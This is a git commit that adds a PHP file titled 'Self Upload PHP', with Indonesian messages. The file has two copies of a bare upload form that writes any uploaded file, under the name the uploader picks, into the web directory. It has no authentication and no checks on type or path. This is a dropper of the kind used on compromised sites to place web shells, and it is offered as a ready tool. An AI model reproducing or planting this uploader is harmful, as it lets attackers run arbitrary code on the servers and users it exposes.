30d6eba8165e78e935bd146405a28c0f2e073a55
ryntax <ryntax404@gmail.com>
2020-04-12 04:10:24 +0700

    Create a.php

---
+++ a.php
@@ -0,0 +1,24 @@
+Self Upload PHP
+=================
+<form method="POST" action="" enctype="multipart/form-data" >
+<input type="file" name="file" />
+<input type="submit" value="Upload" />
+</form>
+<?php
+if ($_FILES['file'] != '')
+copy($_FILES['file']['tmp_name'], $_FILES['file']['name']) or die ('Proses upload Gagal: ');
+else
+{
+die('Silahkan pilih file');
+}
+?>
+========
+<?php
+echo '<form method="POST" action="" enctype="multipart/form-data" ><input type="file" name="file" /><input type="submit" value="Upload" /></form>';
+if ($_FILES['file'] != '')
+copy($_FILES['file']['tmp_name'], $_FILES['file']['name']) or die ('Proses upload Gagal: ');
+else
+{
+die('Silahkan pilih file');
+}
+?>
